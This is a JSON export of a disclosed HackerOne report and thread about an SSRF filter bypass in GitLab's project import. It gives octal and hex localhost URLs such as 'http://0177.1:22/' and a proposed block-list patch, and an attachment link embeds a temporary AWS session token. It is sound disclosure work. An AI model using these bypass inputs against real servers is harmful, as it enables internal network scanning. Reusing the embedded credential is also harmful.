{"id":215105,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTUxMDU=","url":"https://hackerone.com/reports/215105","title":"SSRF vulnerability in gitlab.com via project import.","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-03-21T14:12:33.846Z","submitted_at":"2017-03-21T14:12:33.846Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"edoverflow","url":"/edoverflow","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-11-09T17:51:58.312Z","bug_reporter_agreed_on_going_public_at":"2017-11-09T17:51:58.066Z","team_member_agreed_on_going_public_at":"2017-11-09T02:57:40.774Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Dear GitLab bug bounty team,\n\n# Summary\n---\n\nIt appears as though the fix to [!17286](https://gitlab.com/gitlab-org/gitlab-ce/issues/17286) can be easily bypassed. You have blocked the usage of `http://127.0.0.1`, `http://localhost/`, etc., but `http://0177.1/` and `http://0x7f.1/`, for instance, can still be used to scan internal ports.\n\n~~~\nError importing repository http://0177.1:22/ into {username}/{project} - Cloning into bare repository '[REPOS PATH]/{username}/{project}.git'...\nfatal: unable to access 'http://0177.1:22/': Recv failure: Connection reset by peer\n~~~\n\nAdmittedly, you have restricted the use of certain ports, but I still believe this needs to be fixed.\n\n# Fix\n---\n\nBlock decimal, octal and hex localhost notation.\n\nBest regards,\nEd","vulnerability_information_html":"\u003cp\u003eDear GitLab bug bounty team,\u003c/p\u003e\n\n\u003ch1 id=\"summary\"\u003eSummary\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eIt appears as though the fix to \u003ca href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F17286\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e!17286\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e can be easily bypassed. You have blocked the usage of \u003ccode\u003ehttp://127.0.0.1\u003c/code\u003e, \u003ccode\u003ehttp://localhost/\u003c/code\u003e, etc., but \u003ccode\u003ehttp://0177.1/\u003c/code\u003e and \u003ccode\u003ehttp://0x7f.1/\u003c/code\u003e, for instance, can still be used to scan internal ports.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eError importing repository http://0177.1:22/ into {username}/{project} - Cloning into bare repository \u0026#39;[REPOS PATH]/{username}/{project}.git\u0026#39;...\nfatal: unable to access \u0026#39;http://0177.1:22/\u0026#39;: Recv failure: Connection reset by peer\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAdmittedly, you have restricted the use of certain ports, but I still believe this needs to be fixed.\u003c/p\u003e\n\n\u003ch1 id=\"fix\"\u003eFix\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eBlock decimal, octal and hex localhost notation.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nEd\u003c/p\u003e\n","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-12-09T02:57:40.841Z","allow_singular_disclosure_after":-96429630.57293054,"singular_disclosure_allowed":true,"vote_count":15,"voters":["sp1d3rs","jensec","cdl","ramsexy","yumi","ysx","eveeez","khizer47","cr4xerbik4sh","sup3r-b0y","and 5 more..."],"severity":{"rating":"medium","score":5.4,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1555007,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The issue lies in `lib/gitlab/url_blocker.rb`:\n\n~~~ruby\ndef blocked_url?(url)\n        return false if url.nil?\n        blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n        blocked_ips.concat(Socket.ip_address_list.map(\u0026:ip_address))\n~~~\n\nLink to source code: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/lib/gitlab/url_blocker.rb#L10-14\n\n# Patch\n---\n\n~~~diff\ndef blocked_url?(url)\n        return false if url.nil?\n-        blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n+        blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\", \"0177.1\", \"0x7f.1\", \"127.1\"]\n        blocked_ips.concat(Socket.ip_address_list.map(\u0026:ip_address))\n~~~","markdown_message":"\u003cp\u003eThe issue lies in \u003ccode\u003elib/gitlab/url_blocker.rb\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eblocked_url?\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kp\"\u003efalse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enil?\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eblocked_ips\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;127.0.0.1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;::1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;0.0.0.0\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eblocked_ips\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003econcat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003eSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eip_address_list\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"ss\"\u003e:ip_address\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLink to source code: \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-ce/blob/master/lib/gitlab/url_blocker.rb#L10-14\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fblob%2Fmaster%2Flib%2Fgitlab%2Furl_blocker.rb%23L10-14\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-ce/blob/master/lib/gitlab/url_blocker.rb#L10-14\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"patch\"\u003ePatch\u003c/h1\u003e\n\n\u003chr\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003edef blocked_url?(url)\n\u003c/span\u003e        return false if url.nil?\n\u003cspan class=\"gd\"\u003e-        blocked_ips = [\u0026quot;127.0.0.1\u0026quot;, \u0026quot;::1\u0026quot;, \u0026quot;0.0.0.0\u0026quot;]\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        blocked_ips = [\u0026quot;127.0.0.1\u0026quot;, \u0026quot;::1\u0026quot;, \u0026quot;0.0.0.0\u0026quot;, \u0026quot;0177.1\u0026quot;, \u0026quot;0x7f.1\u0026quot;, \u0026quot;127.1\u0026quot;]\n\u003c/span\u003e        blocked_ips.concat(Socket.ip_address_list.map(\u0026amp;:ip_address))\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-03-21T16:54:00.048Z","updated_at":"2017-03-21T16:54:00.048Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1555258,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @edio,\n\nThose versions of an IP address should be converted to \"127.0.0.1\" by the resolver. This is what I see:\n\n```\nirb(main):005:0\u003e uri = Addressable::URI.parse(\"http://0177.1/\")\n=\u003e #\u003cAddressable::URI:0x3fb2045ee390 URI:http://0177.1/\u003e\nirb(main):006:0\u003e uri.hostname\n=\u003e \"0177.1\"\nirb(main):008:0\u003e ips = Resolv.getaddresses(uri.hostname)\n=\u003e [\"127.0.0.1\"]\nirb(main):009:0\u003e uri = Addressable::URI.parse(\"http://0x7f.1/\")\n=\u003e #\u003cAddressable::URI:0x3fb2014c35cc URI:http://0x7f.1/\u003e\nirb(main):010:0\u003e uri.hostname\n=\u003e \"0x7f.1\"\nirb(main):011:0\u003e ips = Resolv.getaddresses(uri.hostname)\n=\u003e [\"127.0.0.1\"]\n```\n\nWhat you might be seeing is that after an upgrade not all services restarted. This actually happened to me when I was testing your report. Try rebooting the host and running another import. Let me know if you're still seeing an issue.\n\nThanks!\n\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThose versions of an IP address should be converted to \u0026quot;127.0.0.1\u0026quot; by the resolver. This is what I see:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):005:0\u0026gt; uri = Addressable::URI.parse(\u0026quot;http://0177.1/\u0026quot;)\n=\u0026gt; #\u0026lt;Addressable::URI:0x3fb2045ee390 URI:http://0177.1/\u0026gt;\nirb(main):006:0\u0026gt; uri.hostname\n=\u0026gt; \u0026quot;0177.1\u0026quot;\nirb(main):008:0\u0026gt; ips = Resolv.getaddresses(uri.hostname)\n=\u0026gt; [\u0026quot;127.0.0.1\u0026quot;]\nirb(main):009:0\u0026gt; uri = Addressable::URI.parse(\u0026quot;http://0x7f.1/\u0026quot;)\n=\u0026gt; #\u0026lt;Addressable::URI:0x3fb2014c35cc URI:http://0x7f.1/\u0026gt;\nirb(main):010:0\u0026gt; uri.hostname\n=\u0026gt; \u0026quot;0x7f.1\u0026quot;\nirb(main):011:0\u0026gt; ips = Resolv.getaddresses(uri.hostname)\n=\u0026gt; [\u0026quot;127.0.0.1\u0026quot;]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhat you might be seeing is that after an upgrade not all services restarted. This actually happened to me when I was testing your report. Try rebooting the host and running another import. Let me know if you\u0026#39;re still seeing an issue.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-21T18:09:40.425Z","updated_at":"2017-03-21T18:09:40.425Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1555465,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @briann,\n\nI am fairly sure this fix can still be bypassed. What response do you get when importing `http://0177.1:22/`?\n\nI get the same as strukt got in their report:\n\n~~~\nError importing repository http://0177.1:22/ into {username}/{project} - Cloning into bare repository '[REPOS PATH]/{username}/{project}.git'...\nfatal: unable to access 'http://0177.1:22/': Recv failure: Connection reset by peer\n~~~\n\nBest regards,\nEd","markdown_message":"\u003cp\u003eHi \u003ca href=\"/briann\"\u003e@briann\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI am fairly sure this fix can still be bypassed. What response do you get when importing \u003ccode\u003ehttp://0177.1:22/\u003c/code\u003e?\u003c/p\u003e\n\n\u003cp\u003eI get the same as strukt got in their report:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eError importing repository http://0177.1:22/ into {username}/{project} - Cloning into bare repository \u0026#39;[REPOS PATH]/{username}/{project}.git\u0026#39;...\nfatal: unable to access \u0026#39;http://0177.1:22/\u0026#39;: Recv failure: Connection reset by peer\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBest regards,\u003cbr\u003e\nEd\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-21T19:08:05.491Z","updated_at":"2017-03-21T19:08:05.491Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1555558,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @edio,\n\nI've attached a screencap of what I see when I try to import a project from `http://0177.1:22/` using GitLab 8.17.4. The SSRF code works as intended.\n\nI saw the same thing you did when I first ran the upgrade, but after rebooting it was no longer possible to import from that IP.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve attached a screencap of what I see when I try to import a project from \u003ccode\u003ehttp://0177.1:22/\u003c/code\u003e using GitLab 8.17.4. The SSRF code works as intended.\u003c/p\u003e\n\n\u003cp\u003eI saw the same thing you did when I first ran the upgrade, but after rebooting it was no longer possible to import from that IP.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-21T19:43:07.935Z","updated_at":"2017-03-21T19:43:07.935Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":170372,"filename":"import_error.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/170/372/10dce51ee041681515bd498df894abe0c5c32005/import_error.png?response-content-disposition=attachment%3B%20filename%3D%22import_error.png%22%3B%20filename%2A%3DUTF-8%27%27import_error.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045811Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026X-Amz-Signature=106d7c1d41bfe951c2936a25a159471ea725dd3b5be073dbf89c5d70fd841f02"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1555576,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @briann,\n\nWhoops! I guess as you pointed out I just need to reboot. \n\nWhat about https://gitlab.com? Is that still vulnerable?\n\nBest regards,\nEd","markdown_message":"\u003cp\u003eHi \u003ca href=\"/briann\"\u003e@briann\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWhoops! I guess as you pointed out I just need to reboot. \u003c/p\u003e\n\n\u003cp\u003eWhat about \u003ca title=\"https://gitlab.com\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e? Is that still vulnerable?\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nEd\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-21T19:53:09.843Z","updated_at":"2017-03-21T19:53:09.843Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1555643,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've done some more digging and it looks like this is a DNS issue. Some servers return \"127.0.0.1\" for a lookup against \"0771.1\" while others return no value. I'll do some more research and keep you updated.","markdown_message":"\u003cp\u003eI\u0026#39;ve done some more digging and it looks like this is a DNS issue. Some servers return \u0026quot;127.0.0.1\u0026quot; for a lookup against \u0026quot;0771.1\u0026quot; while others return no value. I\u0026#39;ll do some more research and keep you updated.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-21T20:31:45.759Z","updated_at":"2017-03-21T20:31:45.759Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1571144,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @briann,\n\nI was checking on the status of this report and I was wondering if you could give me an update. Is there anything that I can do to help?\n\nBest regards,\nEd","markdown_message":"\u003cp\u003eHi \u003ca href=\"/briann\"\u003e@briann\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI was checking on the status of this report and I was wondering if you could give me an update. Is there anything that I can do to help?\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nEd\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-29T18:10:14.844Z","updated_at":"2017-03-29T18:10:14.844Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1571293,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@edio,\n\nNothing to report just yet. It's still being investigated.","markdown_message":"\u003cp\u003e\u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eNothing to report just yet. It\u0026#39;s still being investigated.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-29T19:12:15.888Z","updated_at":"2017-03-29T19:12:15.888Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1730518,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-05T15:00:29.581Z","updated_at":"2017-06-05T15:00:29.581Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1878515,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @edio,\n\nWe've come up with a proposed solution to this problem that involves checking for DNS resolution when the import is processed and should have something out very soon. Thanks for your patience!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ve come up with a proposed solution to this problem that involves checking for DNS resolution when the import is processed and should have something out very soon. Thanks for your patience!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-30T22:26:27.652Z","updated_at":"2017-07-30T22:26:27.652Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1967058,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @edio,\n\nNo updates just yet, I'm sorry to say. Just checking back in so you don't think we've forgotten about the issue.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eNo updates just yet, I\u0026#39;m sorry to say. Just checking back in so you don\u0026#39;t think we\u0026#39;ve forgotten about the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-30T18:17:31.100Z","updated_at":"2017-08-30T18:17:31.100Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2018417,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Could you please give me an update? Is there anything that I can do to help?","markdown_message":"\u003cp\u003eCould you please give me an update? Is there anything that I can do to help?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-24T09:12:55.952Z","updated_at":"2017-09-24T09:12:55.952Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2019368,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@edio,\n\nNo, nothing you can help with at the moment. We were a bit overwhelmed with security patches in our last security release due to the back-to-back critical releases that preceded it. I'm hoping to get this included in our next security release which should go out in 1-2 weeks. Sorry for the delay!","markdown_message":"\u003cp\u003e\u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eNo, nothing you can help with at the moment. We were a bit overwhelmed with security patches in our last security release due to the back-to-back critical releases that preceded it. I\u0026#39;m hoping to get this included in our next security release which should go out in 1-2 weeks. Sorry for the delay!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-25T03:26:54.103Z","updated_at":"2017-09-25T03:26:54.103Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2084716,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I plan on disclosing this report in 15 days (**Friday, 3 November 2017**). Hopefully you can resolve this issue by then. My aim is to give your users a chance to patch the issue on their own if you cannot fix it in time.","markdown_message":"\u003cp\u003eI plan on disclosing this report in 15 days (\u003cstrong\u003eFriday, 3 November 2017\u003c/strong\u003e). Hopefully you can resolve this issue by then. My aim is to give your users a chance to patch the issue on their own if you cannot fix it in time.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-19T15:27:08.707Z","updated_at":"2017-10-19T15:27:08.707Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2084807,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e We've come up with a proposed solution to this problem that involves checking for DNS resolution when the import is processed and should have something out very soon.\n\n@jobert suggested using https://github.com/jtdowney/private_address_check.\n\n{F230832}","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eWe\u0026#39;ve come up with a proposed solution to this problem that involves checking for DNS resolution when the import is processed and should have something out very soon.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003ca href=\"/jobert\"\u003e@jobert\u003c/a\u003e suggested using \u003ca title=\"https://github.com/jtdowney/private_address_check\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fjtdowney%2Fprivate_address_check\" 